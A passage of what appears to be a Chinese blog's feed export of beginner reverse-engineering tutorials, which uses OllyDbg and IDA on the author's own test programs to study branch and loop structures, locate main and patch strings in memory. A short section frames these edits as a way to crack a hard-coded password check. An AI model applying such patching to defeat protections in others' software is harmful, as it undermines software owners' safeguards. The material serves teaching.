class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"nFlag != 5!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>在 ida32 中打开如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320180543660.png" alt="image-20220320180543660" /></p>
<p>双击进入，即可看到程序执行代码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320180619995.png" alt="image-20220320180619995" /></p>
<p>F5 反编译为 c 语言伪代码，更便于分析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320180856623.png" alt="image-20220320180856623" /></p>
<h2 id="release版识别"><a class="anchor" href="#release版识别">#</a> Release 版识别</h2>
<p>找到主函数 main 进行断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321173958650.png" alt="image-20220321173958650" /></p>
<h3 id="分析主函数main-2"><a class="anchor" href="#分析主函数main-2">#</a> 分析主函数 main</h3>
<p>对 <code>005D1090</code>  和 <code>005D1095</code>  处的函数进行分析</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>D1090  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">68</span>B65E00   PUSH Test<span class="token punctuation">.</span><span class="token number">005</span>EB668</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">005</span>D1095  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">86FFFF</span>FF   CALL Test<span class="token punctuation">.</span><span class="token number">005</span>D1020</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>PUSH输入字符串</pre></td></tr><tr><td data-num="5"></td><td><pre>CALL输出函数或包含输出函数的函数</pre></td></tr></table></figure><p>对 <code>005D109A</code>  处的函数进行分析</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>D109A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D45 F8       LEA EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>             <span class="token punctuation">;</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>将ebp<span class="token operator">-</span><span class="token number">8</span>的地址给eax</pre></td></tr></table></figure><p>对 <code>005D109D</code>  处的函数进行分析</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>D109D  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 F8 <span class="token number">00000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span>               <span class="token punctuation">;</span> <span class="token operator">|</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>给局部变量赋值为<span class="token number">0</span></pre></td></tr></table></figure><p>对 <code>005D10A5</code>  处的函数进行分析</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>D10A5  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">78</span>B65E00   PUSH Test<span class="token punctuation">.</span><span class="token number">005</span>EB678                       <span class="token punctuation">;</span> <span class="token operator">|</span>Arg1 <span class="token operator">=</span> <span class="token number">005</span>EB678 ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">%</span>d是格式化字符串，常用于输入输出和格式化字符串函数</pre></td></tr></table></figure><p>对 <code>005D10B2</code>  处的函数进行分析</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>D10B2  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">837</span>D F8 <span class="token number">05</span>    CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">5</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>cmp对比输入的值</pre></td></tr></table></figure><p>根据跳转结构可以看出</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321175236927.png" alt="image-20220321175236927" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321175247502.png" alt="image-20220321175247502" /></p>
<p>在 <code>005D10C4</code>  处可以进行以下理解</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>D10C4  <span class="token operator">|</span><span class="token operator">></span> \E8 <span class="token number">57FFFF</span>FF   CALL Test<span class="token punctuation">.</span><span class="token number">005</span>D1020                       <span class="token punctuation">;</span> \Test<span class="token punctuation">.</span><span class="token number">005</span>D1020</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>进行了一定的优化，使得俩个分支使用同一个输出函数</pre></td></tr></table></figure><p>如此可以看出 Release 版本的程序相比于 Debug 版本的程序进行了两处优化。</p>
<p>ida 打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321175626862.png" alt="image-20220321175626862" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321175648214.png" alt="image-20220321175648214" /></p>
<h1 id="ifelse多分支"><a class="anchor" href="#ifelse多分支">#</a> ifelse 多分支</h1>
<p>分支结构不止一个 if/else if 等</p>
<h2 id="debug版识别-2"><a class="anchor" href="#debug版识别-2">#</a> Debug 版识别</h2>
<p>找到主函数进行断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321180128184.png" alt="image-20220321180128184" /></p>
<p>if else 结构多分支 Debug 版本特点：</p>
<ul>
<li>由多个 cmp 和 jxx 组合而成</li>
</ul>
<h3 id="分析主函数main-3"><a class="anchor" href="#分析主函数main-3">#</a> 分析主函数 main</h3>
<p>包含或打印函数</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00F</span>BA248  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">50F</span>E0501   PUSH Test<span class="token punctuation">.</span><span class="token number">0105F</span>E50</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00F</span>BA24D  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 C4C2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00F</span>B6516</pre></td></tr></table></figure><p>判断是否为 0</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00F</span>BA26D  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">837</span>D F4 <span class="token number">00</span>    CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr></table></figure><p>不等于 0 进行跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321180631008.png" alt="image-20220321180631008" /></p>
<p>判断是否为 1</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00F</span>BA282  <span class="token operator">|</span><span class="token operator">></span> \<span class="token number">837</span>D F4 <span class="token number">01</span>    CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr></table></figure><p>不等于 1 进行跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321182452119.png" alt="image-20220321182452119" /></p>
<p>如此进行一步步的判断</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321180841521.png" alt="image-20220321180841521" /></p>
<p>不同于单分支的是如果相等则直接 jmp 跳出判断</p>
<h2 id="release版识别-2"><a class="anchor" href="#release版识别-2">#</a> Release 版识别</h2>
<p>找到主函数进行断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321181224712.png" alt="image-20220321181224712" /></p>
<p>在多分支的 Release 版本中可以看到这里有个 <code>TEST EAX,EAX</code>  也即 <code>switch case</code>  结构</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321181459143.png" alt="image-20220321181459143" /></p>
<p>也就是说 Debug 版本中的 <code>if else结构</code> 在 Release 版本中被优化成了 <code>switch case结构</code> 。</p>
<h3 id="在ida中的不同之处"><a class="anchor" href="#在ida中的不同之处">#</a> 在 ida 中的不同之处</h3>
<p>Debug 版本</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321182219422.png" alt="image-20220321182219422" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321181944998.png" alt="image-20220321181944998" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321181959761.png" alt="image-20220321181959761" /></p>
<p>Release 版本</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321182058341.png" alt="image-20220321182058341" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220321182107306.png" alt="image-20220321182107306" /></p>
<p>不同于 Debug 版本的是，release 版本直接打开即可进入 main 函数且速度较快。</p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程之main函数寻找与修改</title>
    <url>/article/c56b0a10.html</url>
    <content><![CDATA[<p>你们的野心什么的我都不在乎！！！但至今为止因为你，这个国家的人连饭都吃不上，对吧？这是我最后的 &quot;四档&quot;！！！直到力竭为止，我都不会停止攻击的！！！唯独你，我绝对要把你！！！轰出 [和之国]！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302192241818.png" alt="image-20220302192241818" /></p>
<h1 id="寻找main函数"><a class="anchor" href="#寻找main函数">#</a> 寻找 main 函数</h1>
<p>对 <code>Debug</code>  和 <code>Release</code>  进行初步了解</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302201739099.png" alt="image-20220302201739099" /></p>
<ul>
<li>
<p><code>Debug</code> ：带调试信息，不会进行太多的优化</p>
</li>
<li>
<p><code>Release</code> ：对程序进行优化，精简代码，合并或取消重复的、无意义的函数，使生成的程序更小，运行速度更快</p>
</li>
</ul>
<p>在分析程序时一般为 <code>Release</code>  版本的程序但同时也不排除有 <code>Debug</code>  版本的程序，在程序分析过程中我们要先找到我们所需要的代码也即 <code>主函数main</code>  中的代码。</p>
<p>准备两个版本的运行程序：</p>
<ul>
<li><code>D.exe</code> ： <code>Debug</code>  版本的运行程序</li>
<li><code>R.exe</code> ： <code>Release</code>  版本的运行程序</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302202456907.png" alt="image-20220302202456907" /></p>
<h2 id="ollydbg打开"><a class="anchor" href="#ollydbg打开">#</a> Ollydbg 打开</h2>
<p>通过 <code>Ollydbg</code>  打开 <code>D.exe</code>  程序来寻找它的 <code>主函数main</code></p>
<h3 id="第一种方式"><a class="anchor" href="#第一种方式">#</a> 第一种方式</h3>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302202649929.png" alt="image-20220302202649929" /></p>
<p>在 <code>Ollydbg</code>  中右键 &quot;查找&quot;-&gt;&quot;所有参考文本字符串&quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302203027111.png" alt="image-20220302203027111" /></p>
<p>可以看到我们想要的字符串</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204100728.png" alt="image-20220302204100728" /></p>
<p>双击即可进入 <code>main函数</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302203834324.png" alt="image-20220302203834324" /></p>
<h3 id="第二种方式"><a class="anchor" href="#第二种方式">#</a> 第二种方式</h3>
<p>打开后在第一行的 <code>call</code>  位置按 &quot; <code>F8</code> &quot; 进行跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204249698.png" alt="image-20220302204249698" /></p>
<p>再次按 &quot; <code>F8</code> &quot;，可以发现右侧注释部分出现红色</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204437728.png" alt="image-20220302204437728" /></p>
<p>多次点击 &quot; <code>F8</code> &quot; 到红色注释部分后</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204532482.png" alt="image-20220302204532482" /></p>
<p>按 &quot; <code>F7</code> &quot;进入后一路&quot; <code>F8</code> &quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204602409.png" alt="image-20220302204602409" /></p>
<p>发现右侧注释部分再次出现红色注释</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204755507.png" alt="image-20220302204755507" /></p>
<p>再次点击 &quot; <code>F8</code> &quot;到该处，若能跳转到此处则按&quot; <code>F7</code> &quot;进入，如若不然则继续&quot; <code>F8</code> &quot; 直到能跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302204858949.png" alt="image-20220302204858949" /></p>
<p>按 &quot; <code>F7</code> &quot; 进入后</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302205018035.png" alt="image-20220302205018035" /></p>
<p>继续一路 &quot; <code>F8</code> &quot;，可以发现三个&quot; <code>push</code> &quot;，一个&quot; <code>call</code> &quot;，我们知道完整的 <code>main函数</code> 是 <code>存在三个完整的参数</code> 的</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302205208536.png" alt="image-20220302205208536" /></p>
<p>此时我们可以标记一下： <code>此处疑似main函数</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302205504882.png" alt="image-20220302205504882" /></p>
<p>此时在此处按 &quot; <code>F7</code> &quot; 进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302205539195.png" alt="image-20220302205539195" /></p>
<p>可以发现 &quot; <code>21r000</code> &quot; 字样，而旁边的红色注释则是条用的 <code>main函数</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302205627082.png" alt="image-20220302205627082" /></p>
<p>同时 <code>Release</code>  版本还可以在打开的页面直接进行查找</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302205941831.png" alt="image-20220302205941831" /></p>
<h2 id="ida打开"><a class="anchor" href="#ida打开">#</a> ida 打开</h2>
<p>打开 <code>ida</code>  后直接将文件拖入后</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302210126653.png" alt="image-20220302210126653" /></p>
<p>自动找到 main 函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220302210159813.png" alt="image-20220302210159813" /></p>
<p>此外 <code>ida</code>  的 &quot; <code>F5</code> &quot; 也可带你进入 <code>main函数</code> 。</p>
<h1 id="修改内存中的数据"><a class="anchor" href="#修改内存中的数据">#</a> 修改内存中的数据</h1>
<p>测试程序代码：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello 21r000!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>运行程序后可以看到，输出结果为 &quot; <code>Hello 21r000!</code> &quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303155617428.png" alt="image-20220303155617428" /></p>
<p>接下来我们开始对该字符串进行修改，采用 <code>Release</code>  版本的运行程序进行测试</p>
<h2 id="直接修改"><a class="anchor" href="#直接修改">#</a> 直接修改</h2>
<p>将 <code>.exe文件</code> 在 <code>Ollydbg</code>  中打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303155524710.png" alt="image-20220303155524710" /></p>
<p>找到 <code>main函数</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303155958921.png" alt="image-20220303155958921" /></p>
<p>添加断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160155673.png" alt="image-20220303160155673" /></p>
<p>同时也可以看到 &quot; <code>Hello 21r000!</code> &quot; 是如何传给 <code>main函数</code> 的，通过 <code>push函数</code> 将字符串压入栈中，这样一来 <code>9020F8</code>  地址中就存储了该字符串的数据信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160314968.png" alt="image-20220303160314968" /></p>
<p>右键选择 &quot;转到&quot;-&gt;&quot;表达式&quot; 之后在弹窗中填写地址信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160530843.png" alt="image-20220303160530843" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160631304.png" alt="image-20220303160631304" /></p>
<p>就可以看到它所存储的信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160655410.png" alt="image-20220303160655410" /></p>
<p>此时直接在这个地址上右键 -&gt;&quot;二进制&quot;-&gt;&quot;编辑&quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160820014.png" alt="image-20220303160820014" /></p>
<p>即可对该处数据信息进行更改，同时左下角勾选 &quot;保持大小&quot;，因为不保持大小可能会将后面的数据信息淹没</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160912004.png" alt="image-20220303160912004" /></p>
<p>将原字符串更改为 &quot; <code>Hello World!!</code> &quot;，同时在 <code>HEX数据</code> 中也可以看到被修改的数据信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303161137903.png" alt="image-20220303161137903" /></p>
<p>此时再对其进行调试就会发现控制台输出的字符串变成了 &quot; <code>Hello World!!</code> &quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303173815909.png" alt="image-20220303173815909" /></p>
<h2 id="修改地址信息"><a class="anchor" href="#修改地址信息">#</a> 修改地址信息</h2>
<p><code>Ctrl + F2</code>  重新运行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303174106738.png" alt="image-20220303174106738" /></p>
<p><code>9020F8</code>  是一个地址，那我们也可以替换掉它的地址信息来进行修改</p>
<p>任意选取一段地址信息进行修改</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303174424369.png" alt="image-20220303174424369" /></p>
<p>修改为如下信息，并将最后两个改为 &quot; <code>0A 00</code> &quot;，而&quot; <code>0A</code> &quot;为回车，&quot; <code>00</code> &quot; 为结尾</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303174559690.png" alt="image-20220303174559690" /></p>
<p>点击确定后可以看到地址信息被修改</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303174817857.png" alt="image-20220303174817857" /></p>
<p>此时回到 <code>主函数main</code>  部分，双击打开汇编</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303174932526.png" alt="image-20220303174932526" /></p>
<p>将地址信息替换为刚刚修改的地址</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303175031954.png" alt="image-20220303175031954" /></p>
<p>点击 &quot;汇编&quot; 后可以发现信息被修改</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303175233672.png" alt="image-20220303175233672" /></p>
<p>此时我们再进行调试可以发现输出信息便为 &quot; <code>21r000 Hello !</code> &quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303175423101.png" alt="image-20220303175423101" /></p>
<h2 id="作用"><a class="anchor" href="#作用">#</a> 作用</h2>
<p>在破解的过程中可能需要一些条件来进行破解，比如某一字符串预留了一个密码为 &quot; <code>123456</code> &quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303175753992.png" alt="image-20220303175753992" /></p>
<p>此时要求这一字符串与该密码一致，在这种情况下我们就可以通过以上两种方式来进行修改，从而达到破解条件。</p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程之三大循环结构与函数解析</title>
    <url>/article/5313226a.html</url>
    <content><![CDATA[<p>无语了，gitee 图床无了。。。。家被偷了，bbq 了，紧急抢救了一波，换了阿里云的 oss (・̀ ω・́)✧</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325205846104.png" alt="image-20220325205846104" /></p>
<h1 id="三大循环结构解析"><a class="anchor" href="#三大循环结构解析">#</a> 三大循环结构解析</h1>
<h2 id="dowhile循环识别"><a class="anchor" href="#dowhile循环识别">#</a> dowhile 循环识别</h2>
<p>三大循环结构：</p>
<ul>
<li>while</li>
<li>dowhile</li>
<li>for</li>
</ul>
<p>这里我们从 dowhile 循环开始进行了解</p>
<p>dowhile 循环结构：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">do</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">code</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>执行顺序：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>先执行code</pre></td></tr><tr><td data-num="2"></td><td><pre>判断是否符合循环条件</pre></td></tr><tr><td data-num="3"></td><td><pre>    如果符合循环条件<span class="token operator">-</span>执行code</pre></td></tr><tr><td data-num="4"></td><td><pre>    如果不符合循环条件<span class="token operator">-</span>不执行code</pre></td></tr></table></figure><h3 id="主函数分析"><a class="anchor" href="#主函数分析">#</a> 主函数分析</h3>
<p>找到主函数，f2 进行断点，f9 执行到断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325154208962.png" alt="image-20220325154208962" /></p>
<p>主函数分析如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>DED3BE  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 F8 <span class="token number">00000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span>               <span class="token punctuation">;</span>  初始化局部变量，<span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00</span>DED3C5  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">8</span>B45 F8       <span class="token operator">/</span>MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>            <span class="token punctuation">;</span>  将局部变量的值赋值给eax，即eax <span class="token operator">=</span> flag</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00</span>DED3C8  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            <span class="token operator">|</span>PUSH EAX</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00</span>DED3C9  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">50</span>BEE700   <span class="token operator">|</span>PUSH <span class="token number">15</span>_dowhi<span class="token punctuation">.</span><span class="token number">00E7</span>BE50                  <span class="token punctuation">;</span>  ASCII "<span class="token operator">%</span>d</pre></td></tr><tr><td data-num="5"></td><td><pre>"</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00</span>DED3CE  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 AECAFFFF   <span class="token operator">|</span>CALL <span class="token number">15</span>_dowhi<span class="token punctuation">.</span><span class="token number">00</span>DE9E81                  <span class="token punctuation">;</span>  格式化输出 printf</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00</span>DED3D3  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       <span class="token operator">|</span>ADD ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00</span>DED3D6  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 F8       <span class="token operator">|</span>MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>            <span class="token punctuation">;</span>  eax <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00</span>DED3D9  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C0 <span class="token number">01</span>       <span class="token operator">|</span>ADD EAX<span class="token punctuation">,</span><span class="token number">1</span>                               <span class="token punctuation">;</span>  eax <span class="token operator">=</span> eax <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00</span>DED3DC  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8945</span> F8       <span class="token operator">|</span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EAX            <span class="token punctuation">;</span>  flag <span class="token operator">=</span> eax</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00</span>DED3DF  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">837</span>D F8 <span class="token number">64</span>    <span class="token operator">|</span>CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">64</span>             <span class="token punctuation">;</span>  判断是否大于<span class="token number">64</span>，如果大于则顺序执行跳出循环，否则通过jl进行跳转</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">00</span>DED3E3  <span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">^</span> <span class="token number">7</span>C E0         \JL SHORT <span class="token number">15</span>_dowhi<span class="token punctuation">.</span><span class="token number">00</span>DED3C5</pre></td></tr></table></figure><p><img 